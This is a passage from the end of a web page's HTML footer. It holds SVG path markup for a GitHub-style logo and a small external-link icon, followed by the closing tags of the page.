xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>